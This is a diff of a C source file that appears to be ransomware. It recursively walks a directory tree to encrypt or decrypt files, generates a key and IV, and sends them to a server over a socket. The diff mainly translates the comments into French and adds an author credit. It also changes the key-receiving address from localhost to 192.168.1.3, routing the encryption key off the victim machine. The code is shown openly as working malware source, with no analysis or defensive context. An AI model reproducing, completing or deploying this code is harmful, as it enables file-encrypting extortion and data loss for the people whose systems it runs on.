@@ -3,18 +3,18 @@
 #include <string.h>
 #include <stdlib.h>
 #include <dirent.h>
-// for socket
+// pour les sockets
 #include <sys/socket.h>
 #include <unistd.h> 
 #include <arpa/inet.h>
 
-// for size of file
+// pour la taille des fichiers
 #include <sys/stat.h>
 
 #define TRUE 0
 #define ENCRYPT_FLAG 0
 #define DECRYPT_FLAG 1
-//1 073 741 824 = 1GB
+//1 073 741 824 octets = 1GB
 #define SIZE_LIMITE 1073741824 
 
 void usage();
@@ -81,7 +81,7 @@ void usage(){
 /*	in : filename
 *	out : TRUE (0) = encrypted .. FALSE (-1) = non_encrypted
 *	
-*	only checks whether the file's extension is ENCRYPT_EXT or not
+*	vérifie uniquement si l'extension du fichier est ENCRYPT_EXT ou non
 */
 
 int is_encrypted(char *filename){
@@ -93,10 +93,10 @@ int is_encrypted(char *filename){
 	return -1;
 }
 
-/*	in : directory name, initialisation vector, key for encryption, flag with value ENCRYPT_FLAG or DECRYPT_FLAG
+/*	in : nom du répertoire, vecteur d'initialisation, clé de chiffrement, drapeau avec la valeur ENCRYPT_FLAG ou DECRYPT_FLAG
 *	out : /
 *
-*	!!!recursive call : browses the file tree
+*	!!! appele recursive : parcourt l'arborescence des fichiers
 */
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
 	DIR *dir = opendir(name);
@@ -147,10 +147,10 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	}
 }
 
-/*	in : *key where the key(binary format) will be stored, size of the key, 
-*	     *iv where the initialisation vector (binary format) will be stored, size of the init vector,
-*	     *pKey where the key(hexa format) will be stored, *pIv where the initialisation vector (hexa format) will be stored
-*	out : generates the key and the initialisation vector pseudo-randomly (both in binary and hexa formats)
+/*	in : *key où sera stockée la clé (format binaire), taille de la clé,
+* iv où sera stocké le vecteur d'initialisation (format binaire), taille du vecteur d'initialisation,
+* pKey où sera stockée la clé (format hexa), *pIv où sera stocké le vecteur d'initialisation (format hexa)
+* out : génère la clé et le vecteur d'initialisation de manière pseudo-aléatoire (aux formats binaire et hexa)
 */
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
 
@@ -163,16 +163,18 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 
 }
 
-/*	in : *pkey address of the format hexa key, *pIv address of the format hexa init vector
+/*	in : *pkey adresse au format hexa key, *pIv adresse au format hexa init vector
 *	out : /
-*	Sends the key/IV through a socket
+*	Envoie la clé/IV via une prise
+*
+*   code fait par Denis 
 */
 int send_key(char *pKey, char *pIv){
 	char msg[4096];
 	sprintf(msg,"KEY : %s\nIV : %s\n",pKey,pIv);
 	int sockid;
 	int server_port= 8888;
-	char *server_ip = "127.0.0.1";
+	char *server_ip = "192.168.1.3";
 	sockid = socket(AF_INET,SOCK_STREAM,0);
 	struct sockaddr_in server_addr;
 	server_addr.sin_family = AF_INET;
